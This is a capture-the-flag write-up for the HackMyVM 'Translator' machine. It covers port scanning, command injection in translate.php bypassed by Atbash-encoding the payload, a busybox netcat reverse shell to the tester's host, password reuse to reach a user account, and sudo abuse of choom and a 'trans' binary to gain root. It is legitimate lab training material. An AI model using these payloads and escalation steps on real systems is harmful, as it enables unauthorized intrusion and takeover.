# Translator

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.197:80
Open 10.0.2.197:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.197
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNxrO/2cjTxr0JK9wggfJldC1RhFqRbLY0KTYgkwKI7arE6s0CafGaXOSaeUN/dsH/f8IRsgqxc8ryz1X39ZLQro5x1UykuKR7+QBnsH1Hh4JB9SsnbRKJ1zagRKhUjhQy+HcFiaplB+d48sRum7efRsEFreSQST/DtdwKSgO6iyH36gwAfgpRKXp5+9epo1qnqzyyt4F68zGpopNOcYjYw2FvrSQXKfEZ/f8jwThCX6uptbGhAMT44mndh8yItDmT3+0LeOiBMQ4uYmgth9hXk0xFyOU5T3rdo6yOsMsqTDqPu/MPoDqVuE1oYtZeVFf7ktV2MM86BH/lIz88lZBAdnU0b20vo3dCvOr6Y5ES8mxk/C4WChkBFK1H06SHvWDReBfg5KM5v25I7LH6B0yqU9HFjIQEAG/mR0fiEbpFV9PHWD2bEALcvT4iZO4hP8fbWujw1rJw5MQ1Sr4ct2oHaYu6Z1SIh0T7ZDLIZToY1opwZZpCf5JCIjHW0FViUms=
|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBKCBV2D8YPyp8pEj0gcuU6tiiGJMcLzBE4yd/rxS5AGoZnDVMzAW56pw3WUDLsaOd3UPVHfrXjiCEBMFYCNdDA=
|   256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9fH/ircmbBSkXOsh+Ed0cDzaFyi5r7WnF0NUWJZATF
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/translator/writeup.png)

It's using rotation for "translation"?
```bash
└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=1 2 3 a b c'
Translated to:<br>1 2 3 z y x
1 2 3 z y x
```

### Command Injection

I was testing for SSTI with `{{7*7}}`, but nothing. Then I tried using `$` at the front and saw no output. Trying shell variables renders output.
```bash
└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=$PWD'
Translated to:<br>$PWD
/var/www/ttml
```

```bash
└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=id'
rw

└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=rw'
id

└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=$(rw)'
uid=33(www-data) gid=33(www-data) groufs=33(www-data)
```

Hmmm
```bash
└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=busybox nc 10.0.2.149 4444 -e /bin/bash'
Translated to:<br>yfhbylc mx 10.0.2.149 4444 -v /yrm/yzhs
yftbylc mx 10.0.2.149 4444 -v /yrm/yzts

└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=$(yfhbylc mx 10.0.2.149 4444 -v /yrm/yzhs)'
---
└─$ penelope -p 4444
www-data@translator:~/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (ocean)

```bash
www-data@translator:~/html$ cat hvxivg
Mb kzhhdliw rh zbfie3w4
└─$ curl 'http://10.0.2.197/translate.php' -G --data-urlencode 'hmv=Mb kzhhdliw rh zbfie3w4'
Translated to:<br>My password is ayurv3d4
My fassword is ayurv3d4
```

```bash
www-data@translator:~/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
ocean:x:1000:1000:ocean,,,:/home/ocean:/bin/bash
india:x:1001:1001:,,,:/home/india:/bin/bash

www-data@translator:~/html$ su - india
Password: ayurv3d4
su: Authentication failure

www-data@translator:~/html$ su - ocean
Password: ayurv3d4
ocean@translator:~$ id
uid=1000(ocean) gid=1000(ocean) grupos=1000(ocean),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### SSH

```bash
└─$ sshpass -p 'ayurv3d4' ssh ocean@10.0.2.197
ocean@translator:~$ id
uid=1000(ocean) gid=1000(ocean) grupos=1000(ocean),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```bash
ocean@translator:~$ cat user.txt
a6765hftgnhvugy473f
```

## Privilege Escalation (india)

```bash
ocean@translator:~$ sudo -l
Matching Defaults entries for ocean on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ocean may run the following commands on translator:
    (india) NOPASSWD: /usr/bin/choom
```

- [https://man7.org/linux/man-pages/man1/choom.1.html](https://man7.org/linux/man-pages/man1/choom.1.html)
- [https://gtfobins.org/gtfobins/choom/](https://gtfobins.org/gtfobins/choom/)

```bash
ocean@translator:~$ sudo -u india choom -n 0 /bin/bash
india@translator:~$ id
uid=1001(india) gid=1001(india) grupos=1001(india)
```

## Privilege Escalation (root)

```bash
india@translator:~$ sudo -l
Matching Defaults entries for india on translator:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User india may run the following commands on translator:
    (root) NOPASSWD: /usr/local/bin/trans
```

```bash
india@translator:~$ sudo /usr/local/bin/trans -M
# Type-> !bash
root@translator:/home/india# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@translator:/home/india# cat /root/root.txt
h87M5364V2343ubvgfy
```
